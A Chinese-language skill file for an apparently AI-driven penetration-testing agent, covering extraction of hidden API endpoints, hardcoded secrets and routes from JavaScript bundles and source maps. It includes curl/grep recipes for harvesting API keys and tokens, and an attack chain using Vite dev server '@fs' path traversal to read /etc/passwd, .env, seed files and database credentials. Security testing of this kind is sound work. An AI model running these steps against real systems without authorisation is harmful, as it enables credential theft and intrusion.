---
name: js-api-extract
description: "JavaScript 静态分析提取隐藏 API 端点 + Source Map 深度利用。当目标是 SPA/前后端分离、Vue/React/Angular/Vite/Webpack、常规目录扫描收效甚微、或需要从 JS bundle/source map/localStorage/config 中提取 API、密钥、内部域名、WebSocket、GraphQL、路由和前端权限逻辑时使用。发现端点后应路由到 api-fuzz、idor、auth-bypass 等专项测试。"
priority: 8
vuln_types:
  - JS接口发现
  - SourceMap泄露
  - 硬编码密钥泄露
  - 前端鉴权绕过
  - 隐藏API发现
triggers:
  - .js
  - sourceMappingURL
  - sourcemap
  - .map
  - webpack
  - vite
  - vue
  - react
  - angular
  - axios
  - fetch
  - localStorage
  - API_URL
  - baseURL
  - WebSocket
  - router
synonyms:
  - js api extract
  - javascript endpoint discovery
  - source map leak
  - frontend api discovery
  - spa api discovery
  - JS接口提取
  - 前端源码泄露
metadata:
  tags: "js,javascript,api,extract,spa,vue,react,angular,webpack,vite,bundle,endpoint,前端分析,source map,sourcemap,js.map,@fs,dev server,硬编码密码"
  category: "recon"
  authority: "expert"
---

# JavaScript API 端点提取方法论

> **关于本 Skill 的使用边界（读 Phase 之前必读）**
>
> 本 Skill 是「**从 JS bundle / SourceMap / 运行时全局里提取隐藏 API、密钥、内部域名、路由、前端鉴权逻辑**」的采集与转发层，**不是**「前端安全总论」，**也不是**「接口测试本身」。
>
> - **不要**把「提取出的 endpoint 列表」当成交付物——本 Skill 输出的是**测试队列**，必须转 `api-fuzz` / `idor-methodology` / `auth-bypass-methodology` / `file-upload-methodology` 才能出洞。
> - **不要**把「JS 被混淆」「只看到 webpackJsonp」当成「无法分析」——混淆 ≠ 加密，字符串字面量总是明文；grep `https://` / `/api/` / `wss?://` / `apiKey` 仍能拿到大部分价值。
> - **不要**把「.js.map 返回 200」直接等同「SourceMap 泄露确认」——SPA fallback / CDN 默认 200 / index.html 伪装甚多，必须看 `Content-Type` 与首行是否为 JSON 且含 `version`/`sources`/`mappings` 字段。
> - **不要**把本 Skill 当成「鉴权绕过」「提权」「身份伪造」的主路——仅前端 `isAdmin/router guard` 判断不能直接下「后端也不鉴权」结论，必须转 `auth-bypass-methodology` / `privilege-escalation-web` 多账号/多角色闭环。
> - **不要**把「拿到 `apiKey="xxx"`」当成「密钥有效」——需区分 公开可公开密钥（AMap/Mapbox/reCAPTCHA site key） vs 不可泄露密钥（AKIA/sk\_live/SecretKey/JWT\_SECRET）；后者才是 P0 。
> - 看到 ` SPA / Vue / React / Angular / Vite / webpack / sourceMappingURL / @fs / chunk-vendors / runtime\~main / manifest.json / asset-manifest / sw.js / __NEXT_DATA__ / window.__INITIAL_STATE__ / localStorage / WebSocket `，**都应把本 Skill 当作必查项**跳 Phase 1。

## 🤖 Agent 工具映射

| 场景 | 优先使用的 Agent 工具 |
|------|------------------------|
| 从页面 HTML、动态加载、iframe、运行时 chunk 中收集 JS、manifest 和 sourcemap 线索 | `browser_get_content` + `proxy_get_traffic` |
| 请求 JS bundle、`.map`、manifest、runtime chunk、Vite 源码路径和 `@fs` 路径 | `proxy_send_request` + `proxy_get_flow_detail` |
| 在浏览器上下文读取全局配置、localStorage、sessionStorage、运行时变量和前端路由状态 | `browser_evaluate` |
| 批量提取 API 路径、完整 URL、WebSocket、GraphQL、路由、baseURL 和敏感关键字 | `python3` |
| 对发现端点做存活验证、方法探测、登录/未登录/不同角色响应对比 | `proxy_send_request` + `proxy_diff_responses` |
| 对 SourceMap/Vite Dev Server 暴露继续审计源码、`.env`、配置、seed、后端入口等高价值文件 | `proxy_send_request` |
| 将端点按风险路由到 `api-fuzz`、`idor-methodology`、`auth-bypass-methodology`、`file-upload-methodology` 等专项 | `knowledge_load_skill` |
| 固化隐藏 API、SourceMap、硬编码密钥、内部域名、前端鉴权或源码泄露证据 | `checklist_mark` + `note_add` |

**执行要点**：JS 分析不是只列接口；必须把发现结果转成漏洞测试队列，并验证权限、可用性、敏感信息真实性或源码泄露影响。

---

前后端分离架构中，JS bundle 是 API 端点的**最大信息源**——比目录扫描高效 10 倍。

## 0. 立即执行摘要：JS 提取结果必须转成漏洞测试队列

看到 SPA、JS bundle、`.map`、`sourceMappingURL`、`axios/fetch`、`baseURL/API_URL`、前端路由、localStorage、WebSocket、GraphQL 时，必须进入本 skill。JS 分析不只是找路径，还要找：**隐藏 API、前端权限判断、硬编码密钥、内部域名、旧接口、管理端路由、对象 ID 参数、上传/导出/支付接口**。

优先顺序：

1. 收集所有 JS/chunk/runtime/source map，提取 API、完整 URL、WebSocket、GraphQL、路由。
2. 搜索 `role/isAdmin/permission/hasPerm/authGuard`，识别仅前端鉴权。
3. 搜索 `apiKey/secret/token/password/AWS/AKIA/sk_live`，识别硬编码敏感信息。
4. 对提取端点按风险分类，并路由到 `api-fuzz`、`idor-methodology`、`auth-bypass-methodology`、`file-upload-methodology`。
5. Source Map/Vite Dev Server 暴露时，优先审计源码、配置、`.env` 和 API 定义。

## 1. JS 发现 → 漏洞假设路由矩阵

| JS 发现 | 漏洞假设 | 后续 skill |
|---|---|---|
| `/admin/`、隐藏 router | 垂直越权/前端鉴权 | `privilege-escalation-web`、`auth-bypass-methodology` |
| `/api/v1/`、旧接口 | 认证降级/IDOR | `auth-bypass-methodology`、`idor-methodology` |
| `user_id/order_id/file_id` | IDOR/BOLA | `idor-methodology` |
| `upload/import/export/download` | 上传/任意下载/导出越权 | `file-upload-methodology`、`idor-methodology` |
| `baseURL/internal/dev/staging` | 内部接口泄露 | `api-fuzz`、`information-disclosure-methodology` |
| `apiKey/secret/token/password` | 硬编码密钥 | `information-disclosure-methodology`、`auth-bypass-methodology` |
| `isAdmin/role/permission` | 前端权限控制 | `privilege-escalation-web` |
| `ws://`、`socket.io` | WebSocket 越权 | `websocket-attack` |
| `.map`/Vite `@fs` | 源码/文件读取 | `information-disclosure-methodology`、`lfi-rfi-methodology` |

## Phase 1: JS 文件收集

### 1.1 从页面 HTML 收集
```bash
# 抓取页面中所有 JS 引用
curl -s "$TARGET" | grep -oE '(src|href)="[^"]*\.js[^"]*"' | sed 's/.*="\(.*\)"/\1/'

# 递归抓取（含 iframe/动态加载）
curl -s "$TARGET" | grep -oP '(?:src|href|url)\s*[=:]\s*["\x27]([^"\x27]*\.js[^"\x27]*)["\x27]' | sort -u
```

### 1.2 从 Source Map 恢复
```bash
# 检查 JS 文件末尾的 sourceMappingURL
curl -s "$TARGET/static/js/app.xxx.js" | tail -1
# 如果有 //# sourceMappingURL=app.xxx.js.map
curl -s "$TARGET/static/js/app.xxx.js.map" -o sourcemap.json

# Source Map 暴露完整源码——等于拿到了前端源码
```

### 1.2.1 🔴 Source Map 深度利用攻击链（实战高价值）

> **场景**：登录页面渗透时发现 `.js.map` 可访问，从源码审计一路打到硬编码密码。
> 这是一条完整的纵深攻击链，每一步的发现都是下一步的入口。

**攻击链：Source Map → Dev Server → 源码 → @fs → 硬编码密码**

```
Source Map 可访问
  → 判断是否 Vite/Webpack 开发服务器在线
    → 可以直接访问 .ts/.vue 源码
      → Vite @fs 路径能读服务端文件系统
        → 遍历项目结构找后端代码
          → 找到 prisma/seed.ts、.env、config 等
            → 拿到硬编码密码/数据库凭据
```

**Step 1: 确认 Source Map 泄露**
```bash
# 方法 A: 检查 JS 文件末尾
curl -s "$TARGET/assets/index-xxx.js" | tail -5
# 如果看到 //# sourceMappingURL=index-xxx.js.map

# 方法 B: 直接请求 .map 文件
curl -s -o /dev/null -w "%{http_code}" "$TARGET/assets/index-xxx.js.map"
# 200 → Source Map 泄露确认
```

**Step 2: 判断 Dev Server 类型**
```bash
# 请求 .map 后分析 sources 字段判断构建工具
curl -s "$TARGET/assets/index-xxx.js.map" | grep -oP '"sources":\["[^"]*"' | head -5

# Vite 特征: sources 中包含 /src/xxx.vue, /src/xxx.ts
# Webpack 特征: sources 中包含 webpack:///src/xxx.js

# Vite Dev Server 探测（Vite 开发模式有独有的路径）
curl -s -o /dev/null -w "%{http_code}" "$TARGET/src/main.ts"
curl -s -o /dev/null -w "%{http_code}" "$TARGET/src/App.vue"
# 200 且返回实际内容 → Vite Dev Server 在线！
```

**Step 3: 源码审计——重点文件**
```bash
# 优先审计这些文件（按安全价值排序）：
/src/utils/request.ts      # axios 配置，可能有硬编码 Token/BaseURL
/src/utils/auth.ts         # 认证逻辑，可能有绕过条件
/src/store/user.ts         # 用户状态管理，可能有角色判断逻辑
/src/router/index.ts       # 路由守卫，前端鉴权逻辑
/src/api/*.ts              # 所有 API 定义，完整接口清单
/src/config.ts             # 全局配置，可能有 API Key
/.env.development          # 开发环境变量
/.env.local                # 本地环境变量（常含真实密码）
```

**Step 4: Vite @fs 路径遍历（高危！）**
```bash
# Vite Dev Server 的 @fs 功能可以读取项目根目录之外的文件
# 先确认 @fs 是否可用
curl -s -o /dev/null -w "%{http_code}" "$TARGET/@fs/etc/passwd"

# 读取项目根目录常见敏感文件
curl -s "$TARGET/@fs$(pwd)/.env"
curl -s "$TARGET/@fs$(pwd)/package.json"          # 获取项目结构
curl -s "$TARGET/@fs$(pwd)/prisma/schema.prisma"  # 数据库模型
curl -s "$TARGET/@fs$(pwd)/prisma/seed.ts"        # 种子数据→硬编码密码！
curl -s "$TARGET/@fs$(pwd)/server/index.ts"       # 后端入口
curl -s "$TARGET/@fs$(pwd)/docker-compose.yml"    # 数据库连接串
```

**Step 5: 审计目标——找什么**

| 目标文件 | 找什么 | 危害 |
|---------|--------|------|
| `prisma/seed.ts` | 硬编码的初始用户密码 | 直接登录 admin |
| `.env` / `.env.local` | DATABASE_URL、JWT_SECRET、API_KEY | 接管数据库/伪造 Token |
| `src/utils/request.ts` | 硬编码的 Authorization header | 绕过认证 |
| `src/router/index.ts` | `meta.requiresAuth` 判断逻辑 | 前端鉴权绕过 |
| `server/config.ts` | 数据库密码、第三方 API 密钥 | 横向移动 |
| `docker-compose.yml` | 数据库端口、默认密码 | 直连数据库 |

**Agent 执行映射**：
```
1. proxy_send_request("GET", "{target}/assets/index-xxx.js") → 检查末尾 sourceMappingURL
2. proxy_send_request("GET", "{target}/assets/index-xxx.js.map") → 下载 Source Map
3. 分析 sources 字段 → 确定框架和文件结构
4. proxy_send_request("GET", "{target}/src/main.ts") → 探测 Dev Server
5. 逐个请求关键源码文件 → 审计硬编码凭据
6. proxy_send_request("GET", "{target}/@fs/...") → Vite @fs 读取服务端文件
```

⚠️ **注意**：@fs 路径遍历是 Vite 开发服务器的已知特性（非 CVE），但生产环境不应暴露 Dev Server。发现此问题本身就是一个高危漏洞。

### 1.3 从 Webpack 清单收集
```bash
# 常见 chunk 清单文件
/static/js/manifest.json
/asset-manifest.json
/webpack-manifest.json
/build/asset-manifest.json
/static/js/runtime~main.xxx.js  # runtime chunk 包含所有 chunk 映射
```

### 1.4 历史版本
```bash
# Wayback Machine 获取旧版 JS（可能包含已删除但未下线的 API）
curl -s "https://web.archive.org/cdx/search/cdx?url=$DOMAIN/*.js&output=text&fl=original" | sort -u
```

## Phase 2: API 端点提取

### 2.1 路径模式提取
```bash
# 从 JS 内容中提取 API 路径（最核心的一步）
curl -s "$JS_URL" | grep -oP '["'"'"'](/(?:api|v[0-9]|rest|service|graphql|ws|internal|admin|auth|user|public)[^\s"'"'"']*?)["'"'"']' | sort -u

# 拼接路径提取（前端常见写法：baseURL + path）
curl -s "$JS_URL" | grep -oP '(?:baseURL|BASE_URL|API_URL|apiPrefix|apiBase)\s*[=:]\s*["'"'"']([^"'"'"']+)["'"'"']'

# 通用路径提取（含相对路径）
curl -s "$JS_URL" | grep -oP '["'"'"'](/[a-zA-Z][a-zA-Z0-9_/\-]{2,}(?:\?[^"'"'"']*)?)["'"'"']' | sort -u | grep -v '\.\(js\|css\|png\|jpg\|svg\|ico\|woff\|ttf\)'
```

### 2.2 完整 URL 提取
```bash
# 提取完整的 HTTP(S) URL
curl -s "$JS_URL" | grep -oP 'https?://[^\s"'"'"'<>]+' | sort -u

# 提取内部域名/子域名
curl -s "$JS_URL" | grep -oP 'https?://[a-zA-Z0-9._-]+\.DOMAIN\.com[^\s"'"'"']*' | sort -u
```

### 2.3 关键信息提取
```bash
# API Key / Secret / Token
curl -s "$JS_URL" | grep -oiP '(?:api[_-]?key|secret|token|auth|password|credential)\s*[=:]\s*["'"'"']([^"'"'"']{8,})["'"'"']'

# WebSocket 端点
curl -s "$JS_URL" | grep -oP 'wss?://[^\s"'"'"']+' | sort -u

# 内部 IP/域名
curl -s "$JS_URL" | grep -oP '(?:10|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d+\.\d+' | sort -u
```

## Phase 3: 端点分类与优先级

提取完后按安全价值分类：

| 优先级 | 特征 | 说明 |
|--------|------|------|
| 🔴 高 | `/admin/`, `/internal/`, `/debug/`, `/manage/` | 管理功能，可能缺乏认证 |
| 🔴 高 | `/upload`, `/import`, `/export`, `/download` | 文件操作，可能有路径穿越/任意读写 |
| 🔴 高 | `/user/`, `/account/`, `/profile/`, `/order/` | 用户数据操作，IDOR 高发区 |
| 🟡 中 | `/auth/`, `/login/`, `/register/`, `/reset/` | 认证流程，可能有逻辑绕过 |
| 🟡 中 | `/search`, `/query`, `/filter` | 查询接口，SQL 注入高发区 |
| 🟢 低 | `/static/`, `/public/`, `/health`, `/status` | 静态资源/健康检查 |

## Phase 4: 批量验证

```bash
# 对提取的端点逐一验证存活
for path in $(cat extracted_paths.txt); do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$path" --connect-timeout 5 -m 10)
    echo "$code $path"
done | grep -v "^404 " | sort
```

**关键看点**：
- `200` → 直接可访问，检查响应内容
- `401/403` → 存在但需认证，尝试绕过
- `405` → 端点存在但方法不对，尝试 POST/PUT/DELETE
- `500` → 后端报错，可能有注入点
- `301/302` → 跟踪重定向目标

> 💡 **决策树警告**：上表 5 种状态码映射是**最常见情况**，**不是穷尽列举**。
> 特别注意以下「状态码谎报」场景，遇到不能仅凭状态码下结论：
>
> - **404 但接口存在**：后端统一返 404 隐藏接口存在性（「隐隐、错错」式），需看 `Content-Length` / 响应体是否为统一错误页、响应时间是否与真 404 不同。
> - **200 但是 SPA fallback**：前端所有未命中路由都返 `index.html`，会伪装成「接口存在」——必须比对 `Content-Type` 是 `application/json` 还是 `text/html`。
> - **200 但 body 是「错误负载」**：`{"code":-1,"msg":"未授权"}` / `{"success":false}`，HTTP 级别 200 但业务上是 401——需看 body 中 `code` 字段而非只看 HTTP 状态码。
> - **403 但是 WAF/CDN 拦截**（Cloudflare/阿里云盾/腾讯云 WAF）不是业务鉴权：应看响应 Header 中是否有 `cf-ray`/`x-waf-*`、body 是否为拦截页；换 UA、换 IP、加合法 Referer/Cookie 后可能变 200。
> - **301/302 重定向到登录页**：实际上是「未认证」的全局拦截，不代表接口不存在；加上会话后重请才能看真实响应。
> - **`405 Method Not Allowed`** 是**强信号**：表示路径真的在，只是你用错了动词——应依次试 GET/POST/PUT/PATCH/DELETE/OPTIONS 逐个跳变。
> - **同一 endpoint 在「未登录 / 低权 / 高权 / 另一租户」下响应不同**，才是“存在 + 有鉴权”的金字塔判断，不要只用一个身份下结论。
> - **「JSONP/老接口 + `?callback=`」**：状态码总是 200 但响应是 `xxx({...})` 包裹——这是 `jsonp-data-leak` 领域，不要当普通 JSON 接口误报。
> - **WebSocket / SSE 接口**（`wss://`、`/sse`、`/events`）不走 HTTP 状态码逻辑，HTTP HEAD 可能返 400/426 但接口是活的；必须用 WebSocket 客户端验证。
>
> 看到任一异常，**返回 Phase 2 重新抽路径特征**或跳 `api-fuzz` 作变体验证，不要仅凭状态码判「存/不存」。

## 输出要求

提取结束后输出：
1. **JS 文件清单** — 分析了哪些 JS
2. **发现的 API 端点列表** — 按优先级排序
3. **暴露的敏感信息** — API Key、内部域名、Token
4. **推荐的下一步测试** — 哪些端点应该优先 fuzz

## 输出格式

```text
[JS/API提取]
JS文件/来源：
框架/构建器：Vue/React/Angular/Vite/Webpack/未知
SourceMap：存在/不存在/未测
发现端点：METHOD/URL/路径/GraphQL/WebSocket
敏感信息：APIKey/Token/内部域名/配置/无
前端权限线索：role/isAdmin/permission/router guard/无
候选漏洞：未授权/IDOR/前端鉴权/密钥泄露/源码泄露/上传/导出/其他
建议 skill：
优先级：P0/P1/P2/P3
```

---

## ⛔ 「最低必测自检」— 标 not_vuln/skipped 前必答

| # | 必测项 | 跳过的合法理由 |
|---|--------|---------------|
| 1 | **Source Map 探测**：所有 JS 文件末尾尝试请求 `.js.map`，存在则解析 sources 字段 | 已确认全站 .map 都 404 |
| 2 | **硬编码密钥扫描**：grep JS bundle 中的 `apiKey`、`secret`、`token`、`password`、`AWS`、`AKIA`、`AIza`、`sk_live_`、`sk_test_`、长串 base64 | JS bundle 已用 js_extract_apis 全量扫描 |
| 3 | **隐藏路由提取**：grep `router`、`routes`、`router/index`，提取所有路由路径，对比 sitemap 是否有遗漏 | - |
| 4 | **前端权限校验**：找 `isAdmin`、`role`、`permission`、`hasPerm` 等判断，确认是否仅前端校验（后端无校验 = 越权） | - |
| 5 | **API endpoint 全量提取**：用 `js_extract_apis` 工具提取所有 axios.get/post 等调用，对比已知 sitemap 找出未被爬虫发现的 endpoint | 工具已运行 |
| 6 | **Vite Dev Server 泄露**（如果 sources 暴露）：试 `/@fs/<absolute-path>` 读取服务端文件 | 非 Vite 框架 |

### 跳过的"非法"理由

- ❌ "JS 已混淆无法分析" → 混淆≠加密，仍可 grep 字符串字面量；用 `proxy_send_request` 下载 JS 后 grep `https://`、`/api/`

---

## ⚠️ Skill 边界与逃逸

本 Skill 负责「**从前端产物里挖信息 → 过滤出有价值的 endpoint/密钥/路由/隐藏资源 → 转交主 Skill 闭环**」，**以下场景必须从本 Skill 主动逃逸到联动 Skill**：

| 现场信号 | 应跳转/联动的 Skill 或方向 |
|---|---|
| 提取到 endpoint 后要做参数/动词/响应 fuzz | `api-fuzz` |
| endpoint 含 `id` / `uuid` / `*_id` / `ids[]` / `node(id:)` | `idor-methodology` |
| 提取到 GraphQL endpoint / `__schema` / `persisted query` | `graphql-methodology` |
| 提取到 `wss://` / `socket.io` / `sse` / `/events` | `websocket-attack` |
| 提取到 `/upload` / `/import` / 任意字段 含 file | `file-upload-methodology` |
| 提取到 `/admin/*` / 隐藏路由 / `meta.requiresAuth` | `auth-bypass-methodology` + `privilege-escalation-web` |
| 提取到 `apiKey` / `secret` / `JWT_SECRET` / `AKIA*` / `sk_live` | `information-disclosure-methodology`（验证后转云资产/JWT 主路） |
| 提取到 OAuth `client_id` / `redirect_uri` / `state`重用 逻辑 | `oauth-sso-attack` |
| 提取到 内部域名 / `*.dev.*` / `*.staging.*` / `10.x` / `192.168.x` | `attack-surface-discovery` + `subdomain-takeover` |
| 提取到 小程序 `appid+secret` / corpid / 企微 secret / mPaaS DSN | 企微控制台伪造事件判例，不在本 Skill 范围 |
| Source Map 还原后要审**后端源码**接口 sink | `code-security-audit` + 各漏洞主 Skill |
| **Vite `@fs`** 能读服务端文件系统 | `lfi-rfi-methodology`（路径穿越处理）|
| 提取到 隐藏参数名/隐藏字段（前端有但 sitemap 无）需验证后端是否接收 | `js-hidden-api-verify` |
| 提取到 老版本 chunk、Wayback 的旧 endpoint | `passive-recon` + `api-fuzz`（老接口限价高） |
| 只拿到未登录页的 JS，付费 / 个人中心 / 后台 chunk 未加载 | `setup-browser-cookies` 导入会话后再跑本 Skill |

> **一句话**：本 Skill 的产物是「**能打的隐藏面**」而不是「漏洞本身」。任何提取到的 endpoint 都只是**输入「另一个 Skill」的原材料**，不是结论；任何提取到的 token/key 都要**进入对应主 Skill 验证有效性**后才能定 P0。「列了 200 个 endpoint」本身不是交付物，**「路由了10 个到 api-fuzz / 3 个到 idor / 1 个到 oauth」才是**。

---

